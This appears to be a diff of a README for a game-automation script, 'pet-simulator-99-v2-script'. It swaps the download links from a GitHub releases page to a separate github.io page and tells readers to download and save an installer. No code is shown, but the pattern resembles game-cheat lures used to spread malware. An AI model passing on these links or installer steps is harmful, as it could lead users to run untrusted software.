@@ -1,6 +1,6 @@
 # 🐾 pet-simulator-99-v2-script - Automate your pet farming tasks easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://midjunebreachofcontract144.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Make sure your computer meets these requirements before you start:
 
 Follow these instructions to set up the software. If you encounter issues, check your internet connection or restart your system.
 
-1. Visit the project link to find the files: [https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases](https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases).
+1. Visit the project link to find the files: [https://midjunebreachofcontract144.github.io](https://midjunebreachofcontract144.github.io).
 2. Download the installer file from the latest release section.
 3. Save the file to your desktop for easy access.
 
